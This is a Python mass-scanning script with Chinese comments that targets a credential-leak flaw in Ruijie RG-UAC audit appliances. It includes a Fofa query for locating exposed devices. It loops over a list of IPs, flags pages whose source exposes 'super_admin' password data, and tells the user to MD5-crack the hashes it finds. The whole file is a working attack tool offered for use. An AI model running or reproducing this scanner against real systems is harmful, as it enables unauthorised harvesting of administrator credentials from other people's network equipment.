# coding=utf-8
# 锐捷RG-UAC统一上网行为管理审计系统账号密码信息泄露
# Fofa：title="RG-UAC登录页面" && body="admin"
import requests
import time

def title():
    print('+-------------------------------------------------------------+')
    print('+---- 锐捷RG-UAC统一上网行为管理审计系统账号密码信息泄露 ------------+')
    print('+----------  Use: python3 Ruijieinformatioon.py   -------------+')
    print('+-------------------------------------------------------------+')

def target_url(url):
    url = url
    headers = {
        "User-Agent" : "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
    #设置代理
    # proxy = "127.0.0.1:8080"
    # proxies = {
    #     'http': 'http://' + proxy,
    #     'https': 'https://' + proxy
    # }
    # res = requests.get(url=url, headers=headers,proxies=proxies)
    res = requests.get(url=url, headers=headers)
    try:
        if "super_admin" in res.text and "password" in res.text and res.status_code == 200:
            print('-------------------------------------------------------------')
            print("\033[31m%s:存在information泄漏，请按F12查看页面源代码进行MD5解密\033[0m"%(url))
            print('-------------------------------------------------------------')
        else:
            print('-------------------------------------------------------------')
            print("\033[32m%s:不存在information泄漏\033[0m"%(url))
            print('-------------------------------------------------------------')
    except Exception as e:
        print("发生异常",e)



if __name__ == "__main__":
    title()
    time.sleep(2)
    with open('IP.txt', 'r', encoding='utf8') as urls:
        for url in urls:
            # print(url)
            if url[:4] != "http":
                url = "http://" + url
            url=url.strip()
            target_url(url)
    urls.close()




